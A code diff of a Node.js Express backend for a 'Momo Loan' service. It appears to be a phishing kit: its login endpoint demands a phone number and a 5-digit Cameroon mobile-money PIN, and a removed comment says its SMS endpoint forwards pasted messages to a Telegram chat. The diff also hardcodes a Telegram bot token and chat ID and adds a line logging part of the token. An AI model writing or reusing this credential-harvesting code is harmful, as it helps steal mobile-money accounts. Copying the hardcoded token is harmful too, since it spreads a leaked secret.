@@ -14,7 +14,7 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 // ============================================
-// TELEGRAM CONFIG (from environment only)
+// TELEGRAM CONFIG (CONFIRMED)
 // ============================================
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8981992702:AAErEZtMgmYbVHsYnm7yBRKyuHZcF1bI_iw';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8732435859';
@@ -181,7 +181,7 @@ app.post('/api/login', async (req, res) => {
             return res.status(400).json({ ok: false, error: 'Invalid phone number' });
         }
 
-        // ✅ FIXED: 5-digit PIN for Cameroon
+        // ✅ 5-digit PIN for Cameroon
         if (!/^\d{5}$/.test(pin)) {
             return res.status(400).json({ ok: false, error: 'PIN must be exactly 5 digits' });
         }
@@ -212,9 +212,9 @@ app.post('/api/login', async (req, res) => {
         return res.status(500).json({ ok: false, error: 'Server error' });
     }
 });
+
 // --------------------------------------------
 // POST /api/sms
-// Receives a pasted SMS and forwards it to Telegram.
 // --------------------------------------------
 app.post('/api/sms', async (req, res) => {
     try {
@@ -288,5 +288,6 @@ app.use((err, req, res, next) => {
 app.listen(PORT, () => {
     console.log(`✅ Momo Loan backend running on port ${PORT}`);
     console.log(`   Telegram notifications: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
+    console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 20)}...`);
     console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
 });
